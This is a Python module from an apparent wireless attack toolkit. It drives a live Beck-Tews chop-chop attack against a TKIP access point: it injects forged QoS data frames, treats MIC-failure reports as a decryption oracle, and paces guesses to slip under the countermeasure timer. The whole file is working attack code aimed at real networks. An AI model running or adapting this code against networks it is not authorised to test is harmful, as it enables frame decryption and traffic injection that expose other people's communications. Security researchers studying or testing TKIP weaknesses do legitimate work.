"""Beck-Tews chop walk against a live TKIP (or downgraded-group-TKIP) AP.

Drives ``BeckTewsWalk`` through a boolean oracle: unlike WEP ChopChop's 256-guess
tagged sweep (the AP's relay carries the accepted VALUE back), the TKIP oracle is a
bare boolean (a MIC-failure report observed, or silence), so guesses are serialized
one at a time and attributed to the in-flight guess by send ordering alone. Wrong
guesses are free; a fired oracle costs a countermeasure-interval wait before the
next byte, and an interleaved rekey (a real 4-way-handshake message, not a
MIC-failure report) aborts the walk rather than spinning for the rest of the run.
"""
from __future__ import annotations

import asyncio
import logging
import time
from typing import Awaitable, Callable, Optional

from wifang.crack.tkip_beck_tews import BeckTewsWalk, Recovered
from wifang.dot11.mac import mac_header, mac_to_str
from wifang.dot11.tkip import tsc_to_iv

logger = logging.getLogger(__name__)

_FC_QOS_DATA_FROM_DS_PROTECTED = bytes([0x88, 0x42])
REKEY_ABORT_REASON = "AP rekeyed"


def _guess_frame(bssid: bytes, client: bytes, tid: int, tsc: int, body: bytes) -> bytes:
    header = mac_header(_FC_QOS_DATA_FROM_DS_PROTECTED, client, bssid, bssid)
    return header + bytes([tid & 0x0F, 0x00]) + tsc_to_iv(tsc) + body


def _always_continue() -> bool:
    return False


class TkipChop:
    """One target frame's Beck-Tews byte-walk, paced by the countermeasure interval
    and aborting with ``REKEY_ABORT_REASON`` the moment a handshake interleaves."""

    PROBE_TIMEOUT_S = 0.5             # ~RTT window attributing the oracle to the in-flight guess
    COUNTERMEASURE_INTERVAL_S = 60.0  # <=1 MIC-failing guess/60s, enforced per recovered byte
    _PACE_POLL_S = 0.2

    def __init__(
        self,
        iface,
        cipher: bytes,
        known_plaintext_prefix: bytes,
        *,
        bssid: bytes,
        client: bytes,
        tid: int = 0,
        tsc: int = 0,
        probe: Optional[Callable[[bytes], Awaitable[bool]]] = None,
        should_stop: Optional[Callable[[], bool]] = None,
        probe_timeout: float = PROBE_TIMEOUT_S,
        countermeasure_interval: float = COUNTERMEASURE_INTERVAL_S,
    ):
        self.iface = iface
        self.bssid = bssid
        self.client = client
        self.tid = tid
        self.tsc = tsc
        self.probe_timeout = probe_timeout
        self.countermeasure_interval = countermeasure_interval
        self._probe = probe or self._live_probe
        self._should_stop = should_stop or _always_continue
        self._bssid_str = mac_to_str(bssid)

        self.walk = BeckTewsWalk(cipher, known_plaintext_prefix, da=client, sa=bssid,
                                 priority=tid, tsc=tsc)
        self._bytes_total = len(cipher) - len(known_plaintext_prefix)
        self.recovered: Optional[Recovered] = None
        self.abort_reason: Optional[str] = None

        self._oracle_fired = asyncio.Event()
        self._rekey_observed = False
        self._watching = False
        self._pace_deadline: Optional[float] = None

    @property
    def bytes_done(self) -> int:
        return self.walk.bytes_done

    @property
    def bytes_total(self) -> int:
        return self._bytes_total

    @property
    def countermeasure_remaining(self) -> float:
        """Seconds left in the current post-success pacing wait, 0 when not pacing."""
        if self._pace_deadline is None:
            return 0.0
        return max(0.0, self._pace_deadline - time.monotonic())

    def _watch(self) -> None:
        if not self._watching:
            self._watching = True
            self.iface.register_rx_callback(self._rx_cb)

    def _unwatch(self) -> None:
        if self._watching:
            self._watching = False
            self.iface.unregister_rx_callback(self._rx_cb)

    def _rx_cb(self, pkt) -> None:
        if getattr(pkt, "type", None) != "eapol" or pkt.bssid != self._bssid_str:
            return
        if pkt.mic_failure:
            self._oracle_fired.set()
            return
        if pkt.msg_num:
            self._rekey_observed = True

    async def run(self) -> Optional[Recovered]:
        """Drive the byte-walk to completion or abort; ``self.recovered`` /
        ``self.abort_reason`` hold the outcome."""
        self._watch()
        try:
            while not self.walk.done:
                if self._should_stop():
                    return None
                if self._rekey_observed:
                    self.abort_reason = REKEY_ABORT_REASON
                    return None
                fired = await self._probe(self.walk.next_guess_frame())
                self.walk.on_oracle(fired)
                if fired and not await self._pace():
                    return None
            self.recovered = self.walk.recovered
            return self.recovered
        finally:
            self._unwatch()

    async def _pace(self) -> bool:
        self._pace_deadline = time.monotonic() + self.countermeasure_interval
        try:
            while time.monotonic() < self._pace_deadline:
                if self._should_stop():
                    return False
                if self._rekey_observed:
                    self.abort_reason = REKEY_ABORT_REASON
                    return False
                await asyncio.sleep(min(self._PACE_POLL_S, self._pace_deadline - time.monotonic()))
            return True
        finally:
            self._pace_deadline = None

    async def _live_probe(self, candidate: bytes) -> bool:
        self._oracle_fired.clear()
        frame = _guess_frame(self.bssid, self.client, self.tid, self.tsc, candidate)
        await self.iface.send_no_wait(frame)
        try:
            await asyncio.wait_for(self._oracle_fired.wait(), self.probe_timeout)
            return True
        except asyncio.TimeoutError:
            return False
